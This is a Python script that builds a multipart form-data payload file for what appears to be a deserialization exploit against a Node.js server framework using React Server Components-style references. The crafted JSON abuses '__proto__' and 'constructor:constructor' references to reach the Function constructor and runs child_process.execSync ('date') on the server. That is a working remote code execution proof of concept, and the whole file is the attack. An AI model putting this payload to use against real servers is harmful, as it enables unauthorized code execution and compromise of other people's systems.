import sys

HEADER_BOUNDARY = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad"

BODY_BOUNDARY = "--" + HEADER_BOUNDARY

CRLF = "\r\n"

json_payload = (
    '{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,'
    '"value":"{\\"then\\":\\"$B1337\\"}","_response":{'
    '"_prefix":"console.log(process.mainModule.require(\'child_process\').execSync(\'date\').toString());//",'
    '"_formData":{"get":"$1:constructor:constructor"}}}'
)

parts = [
    BODY_BOUNDARY,
    'Content-Disposition: form-data; name="0"',
    '',
    json_payload,
    BODY_BOUNDARY,
    'Content-Disposition: form-data; name="1"',
    '',
    '"$@0"',
    BODY_BOUNDARY + "--", # The closing boundary is "--" + ID + "--"
    ""
]

with open("payload.txt", "wb") as f:
    f.write(CRLF.join(parts).encode("utf-8"))

print(f"Generated payload.txt")
print(f"Header Boundary: {HEADER_BOUNDARY}")
print(f"Body Boundary:   {BODY_BOUNDARY}")
